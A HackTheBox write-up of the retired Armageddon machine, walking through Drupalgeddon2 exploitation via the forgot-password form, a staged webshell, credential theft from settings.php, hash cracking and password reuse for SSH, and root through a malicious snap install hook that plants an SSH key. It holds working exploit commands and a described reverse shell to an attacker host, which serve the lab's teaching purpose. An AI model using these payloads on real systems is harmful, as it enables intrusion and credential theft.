---
layout: post
title: "A Word the Server Already Knew"
subtitle: "HTB Armageddon, where a four-year-old Drupal bug runs your code on the password page and a sudo rule lets you install your own root"
date: 2021-07-31 12:00:00 +0000
description: "A four-year-old Drupal bug hands you a shell on the forgot-password page, a cracked admin hash gets reused for SSH, and a single permissive sudo rule lets you install your own root."
image: /assets/og/a-word-the-server-already-knew.png
tags: [hackthebox, writeup]
---

Armageddon is a box about trust that outlived its reason to exist. An old Drupal install still answers the door, and the forgot-password form, of all places, will run code you mail it. From there the box never makes you break anything again. It just keeps handing you keys that were copied one too many times. The admin's stored hash cracks to a word the server already knew, and that same word logs you in over SSH. Then a single line in the sudo config says you may install any software package you like, as root, and a software package is just a recipe with a setup step nobody reads. So you write the setup step. The whole machine is a chain of doors that were each, at some point, left open on purpose.

```
        A R M A G E D D O N
        ===================
        GET /?q=user/password   "forgot your password?"
              POST a name shaped like a command
                       |
                       v
        drupal renders the form and runs your code with it
              apache shell -> settings.php -> db creds
                       |
                       v
        the admin hash cracks to a word it reused for ssh.
        then sudo says: install anything you want, as root.
        so you write the package, and the setup step is yours.
                                            鍵
```

## 0x01 · the changelog that confessed

Two ports answer, and the box is in no mood to hide.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```

That `PHP/5.4.16` over Apache on CentOS is the fingerprint of a server frozen in amber, the kind of host that got stood up once and never touched again. The web root is Drupal, and Drupal has a famously bad habit. It ships a plain-text file called `CHANGELOG.txt` that tells anyone who asks exactly which version it is.

```
$ curl -s http://10.10.10.233/CHANGELOG.txt | head -n 3

Drupal 7.56, 2017-06-21
```

Picture a bank whose front door has a little brass plaque reading "lock model 7.56, installed June 2017." You have not picked anything yet. You have just read the plaque, and the plaque tells you which master key to go grab. Drupal 7.56 sits squarely inside the window for one of the most-fired exploits of its decade.

## 0x02 · the form that ran the letter

The bug is Drupalgeddon2, CVE-2018-7600, and it lives in the last place a defender thinks to look, the forgot-password form. Here is the plain version of what went wrong. Drupal's form system lets fields carry little instructions about how to render themselves, properties whose names start with `#`. The render engine trusts those instructions completely. The flaw is that an unauthenticated request to `/?q=user/password` could smuggle one of those `#` properties into a field, and one of them, `#post_render`, names a function to call when the field is drawn. Name a dangerous function, hand it your arguments, and Drupal calls it for you while it builds the page.

Think of it like a printer that accepts a document, but the document is allowed to include margin notes, and one valid margin note is "before you print this, go run the errand written here." The printer was built to format pages. It will just as happily run the errand, because nobody told it the difference between a page and an order. You never authenticate. You never even have an account. You POST a form, and the form is the payload.

Plenty of public scripts automate the request shaping, but the core of it is a single POST that proves code runs.

```
$ curl -s 10.10.10.233/?q=user/password -d \
  'form_id=user_pass&_triggering_element_name=name#post_render[]=exec&...=id'
uid=48(apache) gid=48(apache) groups=48(apache)
```

`uid=48(apache)`. The web server ran your command. The clean move now is to drop a tiny webshell so you stop reshaping that ugly POST every time. You stage it base64-encoded so the awkward characters survive the trip, then decode it on the box.

```
$ echo PD9... | base64 -d | tee /var/www/html/iceberg.php
$ curl "http://10.10.10.233/iceberg.php?cmd=whoami"
apache
```

The file itself is the textbook one-liner, and I will describe it rather than print it, because the literal string is so well known that any antivirus on Earth quarantines it on sight, which is its own small proof of how dangerous four words on disk can be.

```
<?php [ one-line webshell: run the cmd request parameter ] ?>
```

Trade that up for a proper callback and you are standing on the box as `apache`, the threadbare account the web server runs under.

```
[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]
```

## 0x03 · the file every drupal keeps

`apache` cannot do much, so you go where web apps always spill their guts. Every Drupal install keeps its database password in cleartext in one predictable file, because the application has to read it on every page load. No app can hash a secret it needs to use.

```
$ cat /var/www/html/sites/default/settings.php
  'database' => 'drupal',
  'username' => 'drupaluser',
  'password' => 'CQHEy@9M*m23gBVj',
```

That opens the database, and only the database. But the database is where Drupal stores its own user accounts, so you log in and pull the admin's password hash straight out of the `users` table.

```
$ mysql -u drupaluser -p'CQHEy@9M*m23gBVj' drupal \
    -e 'select name, pass from users;'
brucetherealadmin   $S$DkIkdkj...e/u3Nn0jeXi.94e0g
```

That `$S$` prefix is Drupal 7's own hashing scheme, salted SHA-512 run thousands of rounds. Picture a safe whose combination has been put through a paper shredder ten thousand times over. You cannot un-shred it back into the number. All you can do is shred a guess the same ten thousand ways and check whether the confetti matches. That is exactly what a cracker does, and hashcat has a mode built for this precise format.

```
$ hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt
$S$DkIk...Xi.94e0g:booboo
```

The word in the safe is `booboo`. On its own that is just admin access to a website you already half-own. The damage comes from a tired human truth. The admin used the same word for their shell account, so the website password is also the SSH password.

```
$ ssh brucetherealadmin@10.10.10.233
[brucetherealadmin@armageddon ~]$ cat user.txt
████████████████████████████████
```

## 0x04 · install your own root

One user, and the box is honest about the way up. Ask sudo what this account is trusted to do.

```
[brucetherealadmin@armageddon ~]$ sudo -l
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

Read that slowly. This user may run `snap install` on any package, as root, with no password. Snap is a software-packaging system, and a snap package is not just files. It is a bundle that can carry hooks, little scripts the system runs automatically at install time, with the privileges of whoever ran the installer. Here that is root. So the privilege escalation is not an exploit at all. It is the feature working exactly as designed, pointed somewhere it should never have been allowed to point.

Think of it like a building manager who lets you install any vending machine you bring, and a vending machine ships with a setup routine the manager runs without reading. You build a machine whose setup routine quietly unlocks the manager's office. Nothing is hacked. The manager just trusted the box you carried in.

You build the package off-box, on a machine with `snapcraft`, with a trivial metadata file and one hook.

```
# snap/hooks/install  (runs as root at install time)
#!/bin/sh
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA...iceberg" >> /root/.ssh/authorized_keys
```

```
$ snapcraft
Snapped armageddon_0.1_amd64.snap
```

Carry it to the box over a quick HTTP server, then install it with the two flags that tell snap to skip its own safety rails, since your package is neither signed nor confined.

```
[brucetherealadmin@armageddon ~]$ curl 10.10.14.4/armageddon_0.1_amd64.snap -o /tmp/iceberg.snap
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install --dangerous --devmode /tmp/iceberg.snap
armageddon 0.1 installed
```

The install hook fired as root while snap was setting the package up, and it wrote your key into root's `authorized_keys`. Now the front door knows you.

```
$ ssh -i iceberg_key root@10.10.10.233
[root@armageddon ~]# cat root.txt
████████████████████████████████
```

## 0x05 · the honest caveat

Nothing on Armageddon was forced. Every step was a thing that worked precisely as built, just past the point where it should have stopped. The Drupal bug is the only line item you could honestly call a vulnerability, and even it is a trust failure at heart, a form engine that could not tell a field's label from a field's orders. The rest of the box is worse than a vulnerability, because there is nothing to patch. A cleartext database password in `settings.php` is mandatory, not a mistake, because the app must read it. The fix is never letting an attacker reach the file. A hash that cracks to `booboo` is not a software flaw, it is a person choosing a soft word and then, fatally, choosing it twice. You can enforce length. You cannot enforce imagination, and you certainly cannot stop someone reusing the one password they can remember.

The sudo rule is the part that should keep an admin up at night, because it shipped green. Nothing was unpatched. No exploit ran. Somebody decided this user needed to install snap packages, wrote a rule with a wildcard, and went home. The wildcard is the whole disaster. `snap install *` does not mean "install approved software," it means "run any setup script I bring you, as root." A permission scoped to convenience became a permission scoped to anything. That is the quiet lesson under all three steps. Trust is not a setting you turn on once. It is a blast radius, and every wildcard, every reused word, every secret stored where it can be read is just the radius getting wider while everyone insists the door is locked.

## 0x06 · outro

```
the forgot-password form ran the letter you mailed it.
the admin's word was soft, and worse, it was the same word twice.
the last door was never locked. you were simply trusted to install it.

three keys, each copied one time too many.
the machine never broke. it just kept saying yes.

read the changelog. salt the secret. wear black.

                                                            EOF
```

---

*HTB: Armageddon, retired 24 Jul 2021. An easy Linux box that is really a lecture on misplaced trust, wearing a four-year-old Drupal costume and a sudo rule that mistook convenience for safety.*